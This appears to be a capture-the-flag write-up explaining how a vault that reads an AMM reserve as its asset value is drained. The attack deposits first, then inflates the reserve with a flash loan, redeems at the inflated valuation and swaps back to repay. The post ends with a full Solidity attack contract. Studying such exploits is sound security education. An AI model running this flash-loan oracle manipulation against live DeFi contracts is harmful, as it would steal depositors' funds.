---
title: "Caldrin's Day Away — When the Oracle Returns a Reserve Verbatim"
date: 2026-11-24
tags: ["blockchain", "defi", "solidity", "flash-loan", "oracle"]
categories: ["Cyber Apocalypse 2026"]
summary: "Inflate an AMM reserve with a flash loan, then redeem a claim from a vault that copies that reserve as its own asset valuation. The whitelist fixed which query could be asked, not whether the answer could be trusted."
translationKey: "caldrins-day-away"
---

## Overview

Seven contracts in one bundle.

```
Setup                 deployment, initialization, win check
TradeToken            ERC-20 (CROWN, SALT) — decimals 6
DocksideMarket        AMM. doubles as the asset valuer
GoldhandCredit        flash loan
PublicStampDesk       relays approved oracle queries only
DocksideSharehouse    the target vault
IQuayBorrower         flash loan callback interface
```

The win condition is to push the vault's CROWN balance below a threshold.

```solidity
function isSolved() external view returns (bool) {
    return crownCoin.balanceOf(address(sharehouse)) < SOLVE_THRESHOLD;
}
```

## 1. Initial state

`Setup`'s constructor hardcodes every figure.

| Item | Value |
|---|---|
| market `crownReserve` / `saltReserve` | 1,000,000 / 1,000,000 |
| sharehouse CROWN balance | 1,000,000 |
| sharehouse `recordedHoldings` | 1,000,000 |
| sharehouse `totalClaimMarks` | 990,000e18 (all held by `0xBEEF`) |
| goldhand CROWN balance | 90,000,000 |
| travel purse | 10,000 |
| `SOLVE_THRESHOLD` | 150,000 |

CROWN and SALT have 6 decimals while claim marks are on a 1e18 scale. That is where the `1e12` factor in the share math comes from.

```solidity
if (totalClaimMarks == 0) {
    claimMarkAmount = crownCoinAmount * 1e12;
}
```

All of the initial shares sit with `0xBEEF`, so this branch never runs. It is there to prevent a division by zero.

## 2. What the oracle returns

`DocksideMarket` is both the exchange and the valuer.

```solidity
function valueCargoAsOneGood(uint256 cargoMarkAmount, int128 good) external view returns (uint256) {
    require(good == 0 || good == 1, "UNKNOWN_GOOD");

    uint256 reserve = good == 0 ? crownReserve : saltReserve;

    return (cargoMarkAmount * reserve) / totalCargoMarks;
}
```

`Setup` approves exactly one query.

```solidity
bytes memory callData =
    abi.encodeWithSelector(DocksideMarket.valueCargoAsOneGood.selector, SHAREHOUSE_CARGO_POSITION, int128(0));
```

`SHAREHOUSE_CARGO_POSITION` and `TOTAL_CARGO_MARKS` are both `1_000_000e6`. The ratio is exactly 1, so this function **returns `crownReserve` verbatim.**

It is neither an exchange rate nor a price. The number the vault uses as its own asset value is a copy of one side of an exchange's reserves.

`PublicStampDesk` relays only the approved byte string, via `staticcall`. So there is no way to ask for a different value by changing the cargo amount or the `good` index. **The query is fixed; the answer is not.** The protection covers "what may be asked" and says nothing about "whether the answer can be trusted."

## 3. The vulnerability

The vault's valuation update function has no validation.

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);

    uint256 newHoldings = abi.decode(result, (uint256));

    emit HoldingsRecounted(recordedHoldings, newHoldings);

    recordedHoldings = newHoldings;
}
```

No access control, no rate-of-change cap, no comparison against the previous value. It is `external` so anyone may call it, and the approved order is published through `setup.buildPublicRecountOrder()`.

And withdrawals are proportional to that value.

```solidity
uint256 crownCoinAmount = (claimMarkAmount * recordedHoldings) / totalClaimMarks;
```

Acquire a share first, then inflate `recordedHoldings`, and the same share draws more CROWN.

## 4. Two designed constraints

The author blocked two things, and the attack order follows from them.

**Deposit cap.** The vault only accepts deposits within the travel purse credit.

```solidity
uint256 purseCredit = travelPurseCredit[msg.sender];
require(purseCredit >= crownCoinAmount, "NO_TRAVEL_PURSE");
travelPurseCredit[msg.sender] = purseCredit - crownCoinAmount;
```

The credit is issued by `takeTravelPurse`, once per run.

```solidity
require(!travelPurseTaken, "PURSE_ALREADY_TAKEN");
travelPurseTaken = true;
crownCoin.mint(msg.sender, TRAVEL_PURSE);
sharehouse.creditTravelPurse(msg.sender, TRAVEL_PURSE);
```

Both the coins and the credit attach to `msg.sender`. So **the attack contract has to make this call itself.** Claim it from the EOA first and the credit stays with the EOA, leaving the contract unable to deposit.

The deposit amount is fixed at 10,000. Growing the share ratio is closed off; the only thing that can grow is `recordedHoldings`.

**No deposits during a loan.**

```solidity
require(goldhandCredit.activeBorrower() == address(0), "LOAN_ACTIVE");
```

Inside `onQuayLoan` the `activeBorrower` is set, so deposits are rejected. The share has to be acquired before the flash loan.

The order would have to be the same even without this guard, because `leaveGoods` divides by `recordedHoldings` when computing the share.

```solidity
claimMarkAmount = (crownCoinAmount * totalClaimMarks) / recordedHoldings;
```

Deposit after inflating and the denominator is 91× larger, shrinking the share by the same factor. The guard just makes that mistake impossible.

## 5. Tracing the numbers

### Acquiring the share

```
claimMarkAmount = 10_000e6 * 990_000e18 / 1_000_000e6 = 9_900e18
```

```
totalClaimMarks       990,000e18 → 999,900e18
recordedHoldings      1,000,000  → 1,010,000
vault CROWN balance   1,000,000  → 1,010,000
share ratio           9,900 / 999,900 = 0.990099%
```

### Manipulating the market

Borrow 90,000,000 via flash loan and swap all of it for SALT.

```solidity
amountOut = (amountIn * reserveOut) / (reserveIn + amountIn);
```

```
amountOut   90,000,000 * 1,000,000 / 91,000,000 = 989,010.989 SALT
crownReserve  1,000,000 → 91,000,000
saltReserve   1,000,000 → 10,989.011
```

### Updating the valuation

```
recordedHoldings = crownReserve = 91,000,000
```

### Redeeming the claim

```
payout = 9_900e18 * 91,000,000 / 999_900e18 = 900,990.099 CROWN
vault balance 1,010,000 - 900,990.099 = 109,009.901
```

`109,009.901 < 150,000`, so it passes. The vault does not need to be emptied, only pushed below the threshold.

It is worth checking that the maximum loan is still safe. If the payout exceeds the vault balance, the `transfer` fails and everything rolls back. At a ratio of 0.990099%, exceeding a balance of 1,010,000 would require `crownReserve` above 102,010,100 — and borrowing the entire liquidity only reaches 91,000,000. There is headroom.

## 6. Repayment

Right after the redeem, the holdings are 900,990 CROWN and 989,010 SALT. The debt is 90,000,000. **Repayment is impossible without selling the SALT back.**

```solidity
require(coin.balanceOf(address(this)) >= balanceBefore, "DEBT_NOT_RETURNED");
```

Selling back returns nearly the full amount, because the swap formula carries no fee.

```solidity
return (amountIn * reserveOut) / (reserveIn + amountIn);
```

This expression satisfies `(reserveIn + amountIn) * (reserveOut - amountOut) = reserveIn * reserveOut` exactly. The product is preserved, so a round trip is lossless apart from integer remainders. On an AMM with a fee, the round trip would lose value and part of the stolen CROWN would have to go toward repayment.

```
SALT 989,010.989 → CROWN about 90,000,000
holdings after repayment    about 900,990 CROWN
```

## 7. Full flow

```solidity
function attack() external {
    setup.takeTravelPurse();

    crown.approve(address(sharehouse), 10_000e6);
    sharehouse.leaveGoods(10_000e6);

    goldhand.borrowForOneCall(90_000_000e6, "");
}

function onQuayLoan(uint256 amount, bytes calldata) external override {
    crown.approve(address(market), amount);
    market.trade(0, 1, amount, 0);

    bytes memory stampedOrder = setup.buildPublicRecountOrder();
    sharehouse.recountHoldings(stampedOrder);

    uint256 myClaims = sharehouse.claimMarks(address(this));
    sharehouse.redeemClaim(myClaims);

    uint256 saltBalance = salt.balanceOf(address(this));
    salt.approve(address(market), saltBalance);
    market.trade(1, 0, saltBalance, 0);

    crown.transfer(address(goldhand), amount);
}
```

Repayment goes out as a direct `transfer`. The lender only compares `balanceOf`, so no approve/pull path is needed.

## Notes

- The protection covers only the query. `PublicStampDesk`'s whitelist fixes which function may be called with which arguments, but it does not address the fact that the function reads state that changes within the same transaction. Having an approval list makes the path look vetted, which is worse.
- The valuation rests on a single manipulable state variable. Because `cargoMarkAmount == totalCargoMarks`, the valuation function becomes the identity map on `crownReserve`. That one expression describes the problem more precisely than the general observation that there is no TWAP.
- The same contract is both exchange and valuer. `valueCargoAsOneGood` reads the variable that `trade` writes. Not separating the two is the source of the manipulability.
- The constraints reveal the attack order. The `LOAN_ACTIVE` guard enforces "deposit before borrowing," and the travel purse cap enforces "the share ratio is fixed." With `recordedHoldings` as the only remaining degree of freedom, the attack path becomes effectively unique.
- The fee-free swap formula is what makes repayment possible. Without a lossless round trip, the loan size would have to shrink or the repayment funds would have to be budgeted separately.

---

Full code: [ctf-writeups/2026-cyber-apocalypse/caldrins-day-away](https://github.com/wjddml/ctf-writeups/tree/main/2026-cyber-apocalypse/caldrins-day-away)
